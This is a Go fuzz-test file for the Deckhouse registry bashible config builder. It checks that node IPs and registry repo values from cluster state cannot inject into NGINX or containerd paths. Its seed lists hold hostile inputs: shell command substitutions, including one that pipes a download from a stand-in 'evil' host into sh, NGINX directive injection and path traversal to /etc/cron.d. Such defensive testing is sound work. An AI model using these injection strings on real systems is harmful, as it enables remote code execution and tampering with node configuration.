/*
Copyright 2026 Flant JSC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	 http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

// Fuzz harnesses for the producer of the bashible registry configuration.
//
// Threat model coverage (registry-threat-model.md), harness 10 and the input
// side of harness 2. This is the code site section 6 names first: the hook that
// turns cluster state into the d8-system/registry-bashible-config secret every
// node reads. Two of its inputs come from objects the module does not own:
//
//   - MasterNodesIPs is collected in k8s.go from
//     Node.status.addresses[type=InternalIP], filtered only for being non-empty,
//     and reaches `server <value>;` in the node load balancer's NGINX
//     configuration through registry_const.GenerateProxyEndpoints.
//   - The Unmanaged mode parameters are read from the deckhouse-registry secret,
//     whose ImagesRepo becomes the imagesBase every node pulls from and a mirror
//     host interpolated into /etc/containerd/registry.d.
//
// TM-17 and TM-18 are both assessed as critical, and both are about exactly
// this: a value from cluster state reaching those two sinks.
//
// The oracle is a single statement, and it is deliberately not a restatement of
// the hook's own logic: whatever build() produces must satisfy
// bashible.Config.Validate(). That model carries the rules for these sinks
// (helpers.ProxyEndpoint for endpoints, helpers.MirrorHost and
// helpers.RegistryHost for hosts), and the secret this hook writes is the same
// document the consumer side validates. A configuration this producer emits and
// the model rejects is one that reaches nodes without ever meeting those rules.

package bashible

import (
	"testing"

	"github.com/deckhouse/deckhouse/go_lib/registry/models/bashible"
)

// hostileAddresses are the values a node address must not be able to carry into
// the generated NGINX configuration or the containerd registry directory.
var hostileAddresses = []string{
	"10.0.0.1",
	"",
	"fd00::1",
	"10.0.0.1; return 200",
	"10.0.0.1;}\nserver { listen 127.0.0.1:5002; proxy_pass evil; }",
	"10.0.0.1 # comment",
	"$(id > /tmp/pwned)",
	"`id`",
	"${IFS}",
	"10.0.0.1$(curl http://evil/x|sh)",
	"../../../etc/cron.d/x",
	"evil.example.com",
	"10.0.0.1:5001",
	"999.999.999.999",
	"\x00",
	"\\",
}

func FuzzConfigBuilderMasterNodesIPs(f *testing.F) {
	for _, address := range hostileAddresses {
		f.Add(address, false)
		f.Add(address, true)
	}
	f.Add("10.0.0.1,10.0.0.2,10.0.0.3", false)
	f.Add("10.0.0.1,$(id)", false)
	f.Add(",", false)

	f.Fuzz(func(t *testing.T, joined string, useLocal bool) {
		if len(joined) > 4096 {
			return
		}

		params := ProxyLocalModeParams{
			Username: "ro-user",
			Password: "ro-password",
		}

		builder := ConfigBuilder{MasterNodesIPs: splitFuzzList(joined)}
		if useLocal {
			builder.ModeParams = ModeParams{Local: &params}
		} else {
			builder.ModeParams = ModeParams{Proxy: &params}
		}

		config, err := builder.build()
		if err != nil {
			// A refusal to build is a correct outcome for a hostile input.
			return
		}

		assertConfigValidates(t, config, "MasterNodesIPs", builder.MasterNodesIPs)
	})
}

// FuzzConfigBuilderUnmanaged covers the Unmanaged parameters, which the hook
// reads from the deckhouse-registry secret rather than from the ModuleConfig,
// so they do not pass the ModuleConfig validation on the way in.
func FuzzConfigBuilderUnmanaged(f *testing.F) {
	seeds := []string{
		"registry.example.com/deckhouse/ee",
		"registry.example.com:5000/deckhouse/ee",
		"",
		"registry.example.com",
		"registry.example.com/",
		"registry.example.com/a/../../b",
		"registry.example.com; return 200",
		"registry.example.com$(id)",
		"`id`/x",
		"registry.example.com\nserver 127.0.0.1:5002",
		"../../../etc/cron.d/x",
		"[fd00::1]:5000/x",
		"registry.example.com/deckhouse/ee:tag",
	}

	for _, repo := range seeds {
		f.Add(repo, "https")
		f.Add(repo, "http")
		f.Add(repo, "HTTPS")
		f.Add(repo, "")
	}

	f.Fuzz(func(t *testing.T, imagesRepo, scheme string) {
		if len(imagesRepo) > 4096 || len(scheme) > 64 {
			return
		}

		builder := ConfigBuilder{
			ModeParams: ModeParams{Unmanaged: &UnmanagedModeParams{
				ImagesRepo: imagesRepo,
				Scheme:     scheme,
				Username:   "ro-user",
				Password:   "ro-password",
			}},
		}

		config, err := builder.build()
		if err != nil {
			return
		}

		assertConfigValidates(t, config, "Unmanaged.ImagesRepo", []string{imagesRepo, scheme})
	})
}

// assertConfigValidates is the whole oracle: the secret this hook writes must be
// a document the model accepts.
func assertConfigValidates(t *testing.T, config *Config, field string, values []string) {
	t.Helper()

	if config == nil {
		t.Fatalf("build() returned no config and no error for %s = %q", field, values)
	}

	if err := bashible.Config(*config).Validate(); err != nil {
		t.Fatalf("build() produced a configuration that bashible.Config.Validate() rejects, "+
			"from %s = %q:\n\t%v\n"+
			"proxyEndpoints = %q\n"+
			"hosts = %v\n"+
			"This configuration is written to d8-system/registry-bashible-config and read by "+
			"every node, where the endpoints become `server <value>;` in the balancer's NGINX "+
			"configuration and the hosts become directory names under "+
			"/etc/containerd/registry.d. Nothing between here and those sinks applies these "+
			"rules: the hook's Config is a distinct named type and carries no Validate method.",
			field, values, err, config.ProxyEndpoints, hostNames(config))
	}
}

func hostNames(config *Config) []string {
	names := make([]string, 0, len(config.Hosts))
	for host := range config.Hosts {
		names = append(names, host)
	}
	return names
}

// splitFuzzList reads the fuzzed string as a comma-separated list, so one string
// argument still varies the number of master nodes.
func splitFuzzList(joined string) []string {
	if joined == "" {
		return nil
	}

	var (
		items   []string
		current []byte
	)
	for i := 0; i < len(joined); i++ {
		if joined[i] == ',' {
			items = append(items, string(current))
			current = current[:0]
			continue
		}
		current = append(current, joined[i])
	}
	return append(items, string(current))
}
